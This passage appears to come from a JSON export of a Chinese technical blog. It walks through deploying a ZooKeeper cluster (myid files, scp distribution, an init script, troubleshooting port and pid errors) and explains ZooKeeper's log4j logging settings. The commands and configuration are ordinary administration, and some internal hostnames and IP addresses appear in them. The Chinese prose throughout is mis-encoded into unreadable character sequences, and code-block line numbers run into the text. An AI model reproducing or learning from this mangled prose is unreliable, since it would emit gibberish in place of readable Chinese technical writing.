åˆ›å»ºmaid:è¿™é‡Œæ‰€æœ‰èŠ‚ç‚¹éƒ½éœ€è¦åˆ›å»ºï¼Œæ¥ä¸‹æ¥åœ¨dataDiræ‰€æŒ‡å®šçš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºmyidçš„æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­çš„å†…å®¹åªæœ‰ä¸€è¡Œï¼Œä¸ºæœ¬ä¸»æœºå¯¹åº”çš„idå€¼ï¼Œä¹Ÿå°±æ˜¯ä¸Šå›¾ä¸­server.idä¸­çš„idã€‚ä¾‹å¦‚ï¼šåœ¨æœåŠ¡å™¨1ä¸­çš„myidçš„å†…å®¹åº”è¯¥å†™å…¥1ã€‚åˆ›å»ºmyidï¼šåœ¨zoo.cfgé…ç½®æ–‡ä»¶ä¸­çš„dataDirçš„ç›®å½•ä¸‹é¢åˆ›å»ºmyidï¼Œæ¯ä¸ªèŠ‚ç‚¹myidè¦æ±‚ä¸ä¸€æ ·ï¼š 12vim /data/tools/zookeeper-3.4.5/tmp/myid 0 Step4:è¿œç¨‹å¤åˆ¶åˆ†å‘å®‰è£…æ–‡ä»¶ã€‚æœ€å¥½æ˜¯æŠŠæ–‡ä»¶æ‰“åŒ…scpè¿‡å»ã€‚æ¥ä¸‹æ¥å°†ä¸Šé¢çš„å®‰è£…æ–‡ä»¶æ‹·è´åˆ°é›†ç¾¤ä¸­çš„å…¶ä»–æœºå™¨ä¸Šå¯¹åº”çš„ç›®å½•ä¸‹: 12345scp -P58958 -r zookeeper-3.4.5 jollybi@169.44.62.137:/data/tools/. scp -P58958 -r zookeeper-3.4.5 jollybi@169.44.59.138:/data/tools/. æ‹·è´å®Œæˆåä¿®æ”¹å¯¹åº”çš„æœºå™¨ä¸Šçš„myidã€‚ä¾‹å¦‚ä¿®æ”¹å…¶ä»–ä¸¤å°æœºå™¨ä¸­çš„myidå¦‚ä¸‹ï¼šecho 1 &gt; /data/tools/zookeeper-3.4.5/tmp/myid echo 2 &gt; /data/tools/zookeeper-3.4.5/tmp/myid Step5:å¯åŠ¨ ZooKeeperé›†ç¾¤åœ¨ZooKeeperé›†ç¾¤çš„æ¯ä¸ªç»“ç‚¹ä¸Šï¼Œæ‰§è¡Œå¯åŠ¨ZooKeeperæœåŠ¡çš„è„šæœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789åœ¨ZooKeeperé›†ç¾¤çš„æ¯ä¸ªç»“ç‚¹ä¸Šï¼Œæ‰§è¡Œå¯åŠ¨ZooKeeperæœåŠ¡çš„è„šæœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š[jollybi@zk1.jollychic.com ~]$ /data/tools/zookeeper-3.4.5/bin/zkServer.sh start [jollybi@zk1.jollychic.com ~]$ /data/tools/zookeeper-3.4.5/bin/zkServer.sh start [jollybi@zk1.jollychic.com ~]$ /data/tools/zookeeper-3.4.5/bin/zkServer.sh start [jollybi@zk1.jollychic.com ~]$ jps123189 QuorumPeerMain123309 Kafka1151 Jps æ‰§è¡Œ 1/haozhuo/hadoop/zookeeper-3.4.5/bin/zkServer.sh start Step6:æ£€æµ‹æ˜¯å¦æˆåŠŸå¯åŠ¨:æ‰§è¡Œ jps 124933 QuorumPeerMain å…¶ä¸­ï¼ŒQuorumPeerMainæ˜¯zookeeperè¿›ç¨‹ï¼Œå¯åŠ¨æ­£å¸¸ã€‚ ./zkServer.sh status æŸ¥çœ‹å½“å‰è¿è¡ŒçŠ¶æ€ã€‚ namenode1 1234567891011121314[jollybi@zk1.jollychic.com zookeeper-3.4.5]# ./zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.4.5/bin/../conf/zoo.cfgMode: follower[jollybi@zk1.jollychic.com zookeeper-3.4.5]# ./bin/zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.4.5/bin/../conf/zoo.cfgMode: leader[jollybi@zk1.jollychic.com zookeeper-3.4.5]# ./bin/zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.4.5/bin/../conf/zoo.cfgMode: leader é“¾æ¥æµ‹è¯•123bin/zkCli.sh -server 127.0.0.1:2181bin/zkCli.sh -server 127.0.0.1:2181bin/zkCli.sh -server 127.0.0.1:2181 Step7:å¦‚æœå•å°å¯ä»¥å…¶ä»–å‡ å°ä¸è¡Œï¼Œçœ‹é…ç½®ï¼Œå¦‚æœæ²¡æœ‰é—®é¢˜ã€‚å¯åŠ¨æŸ¥çœ‹çŠ¶æ€å‡ºç°å¼‚å¸¸ã€‚ å¼‚å¸¸è§£å†³:Error contacting service. It is probably not running. 12345è€Œå…¶ä»–ä¸€ä¸ªèŠ‚ç‚¹å´æ˜¯ç°å®æ­£å¸¸;å…ˆstopæ‰åŸzk./bin/zkServer.sh stopç„¶åä»¥start-foregroundæ–¹å¼å¯åŠ¨ï¼Œä¼šçœ‹åˆ°å¯åŠ¨æ—¥å¿—./bin/zkServer.sh start å½“å‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œè®°å¾—æŸ¥çœ‹æ—¥å¿—zookeeper.outï¼Œåœ¨ä½ é…ç½®çš„dataDirï¼ˆåœ¨conf/zoo.cfgä¸­æŸ¥çœ‹ï¼‰ç›®å½•ä¸‹ã€‚ 1232015-12-29 11:09:38,034 [myid:1] - WARN [WorkerSender[myid=1]:QuorumCnxManager@400] - Cannot open channel to 3 at election address Node2/10.0.0.102:38888java.net.ConnectException: æ‹’ç»è¿æ¥at java.net.PlainSocketImpl.socketConnect(Native Method) å¯ä»¥çœ‹åˆ°æ˜¯è¿æ¥åˆ°Node2çš„3888ç«¯å£ä¸é€šï¼ˆæˆ‘é…ç½®æ–‡ä»¶è®¾ç½®çš„èŠ‚ç‚¹ç«¯å£ï¼Œserver.3=Node2:2888:3888ï¼‰ï¼Œè¿™æ ·å°±æ‰¾åˆ°é—®é¢˜äº†ï¼Œæ‰€ä»¥å½“é‡åˆ°é—®é¢˜çš„æ—¶å€™è®°å¾—æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œè¿™æ‰æ˜¯æœ€æœ‰å¸®åŠ©çš„ï¼Œè€Œä¸æ˜¯ä¿®æ”¹ä»€ä¹ˆncå‚æ•°ã€‚ è¿™é‡Œä¸»è¦çœ‹ä¸‹æ˜¯å¦åŠ å…¥hosts æŸ¥çœ‹Node2èŠ‚ç‚¹å‘ç°ï¼Œ38888ç«¯å£ç»‘å¸¦åˆ°127.0.0.1ä¸Šäº†ï¼Œè¿™è®©MasterèŠ‚ç‚¹æ€ä¹ˆè¿æ¥å‘€ï¼Œåªéœ€ä¿®æ”¹/etc/hostsæ–‡ä»¶å³å¯ï¼ŒåŒç†ï¼Œä¿®æ”¹Node1ï¼Œç„¶åé‡å¯zookeeperï¼Œå‘ç°é—®é¢˜è§£å†³ã€‚ 12345127.0.0.1 localhost zk1.jollychic.com::1 localhost localhost.localdomain localhost6 localhost6.localdomain6169.44.62.12 zk1.jollychic.com169.44.59.13 zk2.jollychic.com169.44.62.14 zk3.jollychic.com è¿™é‡Œæˆ‘127.0.0.1 localhost zk1.jollychic.com å°±å¯ä»¥äº†ã€‚ Step8: å¦‚ä½•æ‰©å®¹zookeeperï¼Ÿåªéœ€è¦å°†å·²æœ‰çš„zookeeperæ‰“åŒ…å¤åˆ¶åˆ°æ–°çš„æœºå™¨ä¸Šï¼Œç„¶åä¿®æ”¹myidæ–‡ä»¶å¹¶è®¾ç½®å¥½ï¼Œç„¶åå¯åŠ¨zookeeperå³å¯ã€‚ è®¾ç½®å¼€æœºè‡ªåŠ¨å¯åŠ¨1.å†™ä¸ªå¯åŠ¨è„šæœ¬æ”¾åˆ°/etc/rc.d/init.d/zookeeperè¿™é‡Œtouch zookeeper &amp;&amp; chmod +x zookeeper &amp;&amp; vim zookeeper 12345678910111213!/bin/bash#chkconfig:2345 20 90#description:zookeeper#processname:zookeeperexport JAVA_HOME=/srv/jdk1.8.0_66export PATH=$JAVA_HOME/bin:$PATHcase $1 in start) su root /srv/zookeeper-3.3.6/bin/zkServer.sh start;; stop) su root /srv/zookeeper-3.3.6/bin/zkServer.sh stop;; status) su root /srv/zookeeper-3.3.6/bin/zkServer.sh status;; restart) su root /srv/zookeeper-3.3.6/bin/zkServer.shrestart;; *) echo \"requirestart|stop|status|restart\";;esac 2.è®¾ç½®å¼€æœºå¯åŠ¨ 1chkconfig zookeeper on 3.éªŒè¯ 12chkconfig --add zookeeperchkconfig --list zookeeper è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨service zookeeper start/stopæ¥å¯åŠ¨åœæ­¢zookeeperæœåŠ¡äº†.ä½¿ç”¨chkconfig--add zookeeperå‘½ä»¤æŠŠzookeeperæ·»åŠ åˆ°å¼€æœºå¯åŠ¨é‡Œé¢æ·»åŠ å®Œæˆä¹‹åæ¥è¿™ä¸ªä½¿ç”¨chkconfig--listæ¥çœ‹çœ‹æˆ‘ä»¬æ·»åŠ çš„zookeeperæ˜¯å¦åœ¨é‡Œé¢å¦‚æœä¸Šé¢çš„æ“ä½œéƒ½æ­£å¸¸çš„è¯ï¼›é‡å¯æœåŠ¡å™¨æµ‹è¯•å°±è¡Œã€‚ æ³¨æ„ï¼šzookeeperé‡å¯å‡ºç°å‡ ç§æŠ¥é”™ï¼š1. å¯åŠ¨æœåŠ¡æŠ¥é”™æ‰¾ä¸åˆ°æŒ‡å®šå¥½çš„pidæ–‡ä»¶ã€‚2. å…³é—­æœåŠ¡æŠ¥é”™æ²¡æœ‰åœ¨/tmp/è·¯å¾„ä¸‹é¢æ²¡æœ‰/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid 123456789101112[root@zookeeper zookeeper-3.3.6]# ./bin/zkServer.sh startJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStarting zookeeper ... ./bin/zkServer.sh: line 93: [: /tmp/zookeeper: binary operator expected./bin/zkServer.sh: line 103: /tmp/zookeeper/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•FAILED TO WRITE PID[root@zookeeper zookeeper-3.3.6]# ./bin/zkServer.sh stopJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStopping zookeeper ... no zookeeper to stop (could not find file /tmp/zookeeper/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid) è§£å†³æ–¹æ³•ï¼šç½‘ä¸Šå¾ˆå°‘æœ‰äººè®²è¿™ä¹ˆè¯¦ç»†ï¼Œè¿™é‡Œæˆ‘å°±è¯´ä¸‹ï¼Œå°±æ˜¯ä½ åœ¨ä¿®æ”¹zoo.cfgé…ç½®æ–‡ä»¶é‡Œé¢ï¼š dataDiræŒ‡å®šçš„è·¯å¾„æ˜¯è‡ªå®šä¹‰çš„è¯ç­‰äºçš„æ—¶å€™ä¸è¦ç©ºæ ¼å†™ã€‚ å¦‚æœé‡æ–°å¦å¤–å†™dataDir ,ä¸è¦æ³¨é‡Šæ‰ä¹‹å‰çš„ï¼Œæœ€å¥½ç›´æ¥åˆ é™¤ï¼Œé‡æ–°æŒ‡å®šè¿™æ ·å°±ä¸ä¼šæŠ¥é”™äº†ï¼Œå¦‚æœæ³¨é‡Šæ‰é»˜è®¤çš„#dataDir = /tmpè¿™é‡Œéœ€è¦ç©ºæ ¼ã€‚ Step9.æŠ¥é”™å ç”¨ç«¯å£ï¼š123JMX enabled by defaultUsing config: /opt/app/zookeeper/bin/../conf/zoo3.cfgStarting zookeeper ... STARTED æŸ¥çœ‹çŠ¶æ€ï¼šç”¨jpså‘½ä»¤æŸ¥çœ‹è¿›ç¨‹ï¼š 1234567# jps24617 QuorumPeerMain ï¼ˆè¿™ä¸ªå°±æ˜¯zookeeperè¿›ç¨‹ï¼‰/opt/app/zookeeper/bin/zkServer.sh status zoo1.cfgJMX enabled by defaultUsing config: /opt/app/zookeeper/bin/../conf/zoo1.cfgError contacting service. It is probably not running. Ihaozhuo_b3314è¯´æ˜æœ‰é”™è¯¯ï¼ŒæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼š 12345# cd &lt;zookeeper_home&gt;# less zookeeper.outjava.net.BindException: åœ°å€å·²åœ¨ä½¿ç”¨æ€æ‰å½“å‰è¿›ç¨‹ï¼š# kill -9 24617 æŠ¥é”™: å¯åŠ¨æœåŠ¡æ­£å¸¸ã€‚1234[root@api1 zookeeper-3.3.6]# ./bin/zkServer.sh startJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStarting zookeeper ... STARTED å¯æ˜¯æŸ¥è¯¢è¿›ç¨‹ä¸å­˜åœ¨ï¼Œå¯æ˜¯çœ‹pidæ˜¯æœ‰çš„ï¼Œç„¶åå…³é—­æœåŠ¡å°±è¯´æ²¡æœ‰è¿™ä¸ªè¿›ç¨‹ã€‚ 123JMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStopping zookeeper ... ./zkServer.sh: line 133: kill: (31415) - æ²¡æœ‰é‚£ä¸ªè¿›ç¨‹ èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š12345678910111213141516[root@kafka_03 bin]# sh zkCli.shConnecting to localhost:21812017-01-04 19:20:24,849 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT2017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:host.name=kafka_032017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:java.version=1.8.0_662017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.vendor=Oracle Corporation2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/log4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib[zk: localhost:2181(CONNECTED) 0] ls /[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp][zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids[0, 1, 2]æ˜¾ç¤º0 1 2 ä¸‰å°é›†ç¾¤æœºå™¨ã€‚ kafka ä¸‰å°é›†ç¾¤è¿™é‡Œå¯ä»¥çœ‹åˆ°è·å–åˆ°idsã€‚ Step10: ç›¸å…³æ–‡æ¡£ã€ŠHBase-0.98.0åˆ†å¸ƒå¼å®‰è£…æŒ‡å—ã€‹ ã€ŠHive 0.12.0å®‰è£…æŒ‡å—ã€‹ ã€ŠZooKeeper-3.4.6åˆ†å¸ƒå¼å®‰è£…æŒ‡å—ã€‹ ã€ŠHadoop 2.3.0æºç åå‘å·¥ç¨‹ã€‹ ã€Šåœ¨Linuxä¸Šç¼–è¯‘Hadoop-2.4.0ã€‹ ã€ŠAccumulo-1.5.1å®‰è£…æŒ‡å—ã€‹ ã€ŠDrill 1.0.0å®‰è£…æŒ‡å—ã€‹ ã€ŠShark 0.9.1å®‰è£…æŒ‡å—ã€‹ æ›´å¤šï¼Œæ•¬è¯·å…³æ³¨æŠ€æœ¯åšå®¢ï¼šhttp://blog.yancy.cc Step11: ç»“æŸè¯­è‡³æ­¤ï¼ŒZooKeeperåˆ†å¸ƒå¼å®‰è£…å¤§å‘ŠæˆåŠŸï¼æ›´å¤šç»†èŠ‚ï¼Œè¯·æµè§ˆå®˜æ–¹æ–‡æ¡£ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/05/26/Bigdata-hadoop/zookeeper/Bigdata-ZooKeeperé›†ç¾¤å¿«é€Ÿæ­å»ºé…ç½®ä¸æ‰©å®¹/"},{"title":"Bigdata-Zookeeperé›†ç¾¤æ—¥å¿—é…ç½®è¯¦è§£å’Œæ¸…ç†è‡ªå®šä¹‰å¯åŠ¨å†…å­˜","text":"Zookeeperé›†ç¾¤æ—¥å¿—é…ç½®è¯¦è§£å’Œæ¸…ç†è‡ªå®šä¹‰å¯åŠ¨å†…å­˜é—®é¢˜ï¼šæ­å»ºzookeeperå’Œkafkaé›†ç¾¤è¿è¡Œå¤§æ•°æ®å¤„ç†æ•°æ®æ¶ˆè´¹ï¼Œå…¬å¸dubboä½¿ç”¨zookeeperåšæœåŠ¡ç«¯çš„æœåŠ¡å‘ç°ç®¡ç†åŠé…ç½®ä¸­å¿ƒï¼Œåœ¨ä½¿ç”¨æ—¶éƒ½å‡ºç°è¿‡ç”±äºzkçš„æ—¥å¿—å¤§å°è¿‡å¤§å¡æ»¡ç£ç›˜çš„æƒ…å†µ ï¼Œé‡åˆ°äº†Zookeeperæ—¥å¿—é—®é¢˜è¾“å‡ºè·¯å¾„çš„é—®é¢˜, å‘ç°zookeeperè®¾ç½®log4j.propertiesä¸èƒ½è§£å†³æ—¥å¿—è·¯å¾„é—®é¢˜, å‘ç°è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ã€‚ zookeeperæ—¥å¿—è¯´æ˜ZooKeeperä½¿ç”¨SLF4J(the Simple Logging Facade for Java)ä½œä¸ºæ—¥å¿—çš„æŠ½è±¡å±‚ï¼Œé»˜è®¤ä½¿ç”¨Log4Jæ¥åšå®é™…çš„æ—¥å¿—å·¥ä½œã€‚ä½¿ç”¨2å±‚æ—¥å¿—æŠ½è±¡çœ‹èµ·æ¥çœŸæ˜¯å¤Ÿå‘›ï¼Œè¿™é‡Œç®€è¦çš„è¯´æ˜å¦‚ä½•æ¥é…ç½®Log4Jã€‚å°½ç®¡Log4Jéå¸¸çµæ´»ä¸”å¼ºå¤§ï¼Œä½†å®ƒä¹Ÿæœ‰ä¸€äº›å¤æ‚ï¼Œå¯ä»¥ç”¨ä¸€æ•´æœ¬ä¹¦æ¥æè¿°å®ƒï¼Œè¿™é‡Œåªæ˜¯ç®€è¦çš„ä»‹ç»ä¸€ä¸‹åŸºæœ¬çš„ç”¨æ³•ã€‚ Log4Jçš„é…ç½®æ–‡ä»¶åä¸ºlog4j.propertiesï¼Œä»classpathä¸­æŸ¥æ‰¾ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°log4j.propertiesæ–‡ä»¶ï¼Œä¼šè¾“å‡ºå¦‚ä¸‹è­¦å‘Šä¿¡æ¯ï¼š 12log4j:WARN No appenders could be found for logger (org.apache.zookeeper.serv ... log4j:WARN Please initialize the log4j system properly. å®ƒè¯´çš„æ˜¯æ‰€æœ‰åç»­çš„æ—¥å¿—æ¶ˆæ¯ä¼šè¢«ä¸¢å¼ƒï¼Œé€šå¸¸log4j.propertiesæ–‡ä»¶ä¼šæ”¾åœ¨confæ–‡ä»¶å¤¹ï¼Œå¹¶æ”¾åœ¨classpathä¸‹ã€‚æ¥çœ‹çœ‹ZooKeeperä½¿ç”¨çš„log4j.propertiesçš„ä¸»è¦éƒ¨åˆ†ï¼š 123456789101112131415161718192021222324[jollybi@kafka2 conf]$ cat log4j.properties | grep -Pv \"^$|^#\"zookeeper.root.logger=INFO, CONSOLE #ï¼ˆ1ï¼‰zookeeper.console.threshold=INFOzookeeper.log.dir=.zookeeper.log.file=zookeeper.logzookeeper.log.threshold=DEBUGzookeeper.tracelog.dir=. zookeeper.tracelog.file=zookeeper_trace.loglog4j.rootLogger=$&#123;zookeeper.root.logger&#125; #ï¼ˆ2ï¼‰log4j.appender.CONSOLE=org.apache.log4j.ConsoleAppender #ï¼ˆ3ï¼‰log4j.appender.CONSOLE.Threshold=$&#123;zookeeper.console.threshold&#125; #ï¼ˆ4ï¼‰log4j.appender.CONSOLE.layout=org.apache.log4j.PatternLayout #ï¼ˆ5ï¼‰log4j.appender.CONSOLE.layout.ConversionPattern=%d&#123;ISO8601&#125; [myid:%X&#123;myid&#125;] - %-5p [%t:%C&#123;1&#125;@%L] - %m%nlog4j.appender.ROLLINGFILE=org.apache.log4j.RollingFileAppender #ï¼ˆ6ï¼‰log4j.appender.ROLLINGFILE.Threshold=$&#123;zookeeper.log.threshold&#125; #ï¼ˆ7ï¼‰log4j.appender.ROLLINGFILE.File=$&#123;zookeeper.log.dir&#125;/$&#123;zookeeper.log.file&#125;log4j.appender.ROLLINGFILE.MaxFileSize=10MBlog4j.appender.ROLLINGFILE.layout=org.apache.log4j.PatternLayoutlog4j.appender.ROLLINGFILE.layout.ConversionPattern=%d&#123;ISO8601&#125; [myid:%X&#123;myid&#125;] - %-5p [%t:%C&#123;1&#125;@%L] - %m%nlog4j.appender.TRACEFILE=org.apache.log4j.FileAppenderlog4j.appender.TRACEFILE.Threshold=TRACElog4j.appender.TRACEFILE.File=$&#123;zookeeper.tracelog.dir&#125;/$&#123;zookeeper.tracelog.file&#125;log4j.appender.TRACEFILE.layout=org.apache.log4j.PatternLayoutlog4j.appender.TRACEFILE.layout.ConversionPattern=%d&#123;ISO8601&#125; [myid:%X&#123;myid&#125;] - %-5p [%t:%C&#123;1&#125;@%L][%x] - %m%n (1) zookeeper.root.logger=INFO, CONSOLEç¬¬ä¸€ç»„è®¾ç½®ä»¥zookeeperå¼€å¤´ï¼Œå®ƒä»¬å®é™…ä¸Šæ˜¯Java system propertyï¼Œå¯ä»¥è¢«-Då½¢å¼çš„å‘½ä»¤è¡Œå‚æ•°è¦†ç›–ã€‚ç¬¬ä¸€è¡Œé…ç½®äº†æ—¥å¿—çº§åˆ«ï¼Œé»˜è®¤çš„è®¾ç½®æ˜¯è¯´åœ¨INFOçº§åˆ«ä»¥ä¸‹çš„æ—¥å¿—ä¼šè¢«ä¸¢å¼ƒï¼Œå¹¶ä¸”æ—¥å¿—ä¼šä½¿ç”¨CONSOLE appenderè¾“å‡ºã€‚ä½ å¯ä»¥æŒ‡å®šå¤šä¸ªappenderï¼Œä¾‹å¦‚å¦‚æœä½ æƒ³ä½¿ç”¨CONSOLE appenderå’ŒROLLINGFILE appenderè¾“å‡ºæ—¥å¿—ï¼Œé‚£ä¹ˆå¯ä»¥é…ç½®zookeeper.loggerä¸ºINFO,CONSOLE,ROLLINGFILEã€‚ (2) rootLoggerå¤„ç†æ‰€æœ‰æ—¥å¿—çš„loggerï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰å®šä¹‰å…¶ä»–loggerã€‚ (3) log4j.appender.CONSOLE=org.apache.log4j.ConsoleAppenderè¿™ä¸€è¡ŒæŠŠCONSOLE appenderå’Œå®é™…ä¸Šå¤„ç†æ—¥å¿—è¾“å‡ºçš„ç±»ç»‘å®šåœ¨ä¸€èµ·ï¼Œè¿™é‡Œæ˜¯ConsoleAppenderç±»ã€‚ (4) appenderä¹Ÿå¯ä»¥è¿‡æ»¤æ—¥å¿—ã€‚è¿™ä¸€è¡Œå°†è¿‡æ»¤ä»»ä½•åœ¨INFOçº§åˆ«ä¹‹ä¸‹çš„æ—¥å¿—ï¼Œå› ä¸ºè¿™æ˜¯åœ¨zookeeper.root.loggerè®¾ç½®çš„thresholdã€‚ (5) appenderä½¿ç”¨ä¸€ä¸ªå¸ƒå±€(layout)ç±»åœ¨è¾“å‡ºå‰å¯¹æ—¥å¿—è¿›è¡Œæ ¼å¼åŒ–ã€‚æˆ‘ä»¬ä½¿ç”¨pattern layoutæ¥è®°å½•æ—¥å¿—çš„çº§åˆ«ï¼Œæ—¥æœŸï¼Œçº¿ç¨‹ä¿¡æ¯å’Œè°ƒç”¨ä½ç½®ä¿¡æ¯ä»¥åŠæ¶ˆæ¯æœ¬èº«ã€‚ (6) RollingFileAppenderå®ç°äº†rollingæ—¥å¿—æ–‡ä»¶çš„åŠŸèƒ½ï¼Œè€Œä¸æ˜¯æŒç»­çš„å†™åˆ°ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶æˆ–è€…æ§åˆ¶å°ã€‚å¦‚æœrootLoggeræ²¡æœ‰å…³è”ROLLINGFILEï¼Œåˆ™æ­¤appenderä¼šè¢«å¿½ç•¥ã€‚ (7) ROLLINGFILEçš„thresholdè®¾ç½®æˆDEBUGã€‚å› ä¸ºrootLoggerè¿‡æ»¤äº†æ‰€æœ‰åœ¨INFOçº§åˆ«ä¹‹ä¸‹çš„æ—¥å¿—ï¼Œæ²¡æœ‰DEBUGæ—¥å¿—ä¼šè¾“å‡ºåˆ°ROLLINGFILEã€‚å¦‚æœä½ æƒ³è¦çœ‹åˆ°DEBUGæ—¥å¿—ï¼Œä½ å¿…é¡»æŠŠzookeeper.root.loggerä»INFOæ”¹æˆDEBUGã€‚ æ‰“æ—¥å¿—ä¼šå½±å“åˆ°è¿›ç¨‹çš„æ€§èƒ½ï¼Œå°¤å…¶æ˜¯åœ¨DEBUGçº§åˆ«ä¸‹ã€‚åŒæ—¶æ—¥å¿—ä¼šæä¾›æœ‰ä»·å€¼çš„ä¿¡æ¯ä¸ºè¯Šæ–­é”™è¯¯æä¾›çº¿ç´¢ã€‚ä¸€ä¸ªå¹³è¡¡æ€§èƒ½å¼€é”€çš„æœ‰æ•ˆæ–¹å¼æ˜¯æŠŠappenderçš„thresholdè®¾æˆDEBUGï¼Œå¹¶æŠŠrootLoggerè®¾æˆWARNçº§åˆ«ï¼Œè¿™åœ¨ä¸€èˆ¬çš„æƒ…å†µéƒ½é€‚ç”¨ï¼Œä¸€èˆ¬åªéœ€è¦å…³æ³¨WARNINGå’Œå®ƒä¹‹ä¸Šçš„æ—¥å¿—ã€‚å½“ä½ éœ€è¦è¯Šæ–­é—®é¢˜æ—¶å¯ä»¥ä½¿ç”¨JMXåŠ¨æ€è®¾ç½®ä¸ºINFOæˆ–DEBUGçº§åˆ«ï¼Œè¿™æ ·å¯ä»¥æ›´æ–¹ä¾¿å®šä½é—®é¢˜ã€‚ å¿«ç…§äº‹ç‰©æ—¥å¿—,ä¿®æ”¹æ—¥å¿—è¾“å‡ºç›®å½•ä¹‹å‰å‡ºç°zookeeperåœ¨binç›®å½•ä¸‹å‡ºç°äº†zookeeper.outçš„æ—¥å¿—æ–‡ä»¶ï¼Œç»åˆ†æå‘ç°æ­¤æ–‡ä»¶æ˜¯ç”±äºnohupå‘½ä»¤æ‰“å°çš„æ§åˆ¶å°æ—¥å¿—ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨zoo.cfgé…ç½®æ–‡ä»¶ä¸­ï¼Œå¯¹æ—¥å¿—æ–‡ä»¶è¿›è¡Œäº†é…ç½®ï¼ˆæˆªå–éƒ¨åˆ†ï¼‰ 12dataDir=/data/tools/zookeeper-3.4.5/tmpdataLogDir=/data/tools/zookeeper-3.4.5/tmp/logs å…¶ä¸­ï¼ŒdataDirå’ŒdataLogDiræ˜¯é’ˆå¯¹æ•°æ®ä¿¡æ¯åŠæ•°æ®ä¿¡æ¯æ—¥å¿—çš„ä½ç½®é…ç½®ã€‚ä½†æ˜¯åœ¨zookeeperå†…éƒ¨é›†æˆäº†log4j.propertiesï¼ˆå¯¹åº”é…ç½®æ–‡ä»¶åœ¨confè·¯å¾„ä¸‹ï¼‰ã€‚ å‚è€ƒlog4jé…ç½®è¯´æ˜æ‰“å¼€log4j.propertiesæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°æœ‰è¿™æ ·çš„é…ç½®ï¼Œå®ƒåœ¨è¯´æ˜å…³äºzookeeperæœ¬èº«çš„ä¸€äº›é»˜è®¤è®¾ç½®ï¼Œä½†æ˜¯å¯ä»¥è¢«ç³»ç»Ÿé…ç½®æ–‡ä»¶æ‰€è¦†ç›–ã€‚é‚£ä¹ˆï¼Œåœ¨log4jä¸­ï¼Œrootæ˜¯log4jè®°å½•çš„åŸå§‹èµ·ç‚¹ï¼Œè€Œè¿™éƒ¨åˆ†å‚æ•°åˆå¯ä»¥è¢«ç³»ç»Ÿä¿®æ”¹ï¼Œé‚£ä¹ˆç³»ç»Ÿé…ç½®åœ¨ä»€ä¹ˆåœ°æ–¹å‘¢ï¼Ÿ 12345678# Define some default values that can be overridden by system propertieszookeeper.root.logger=INFO, 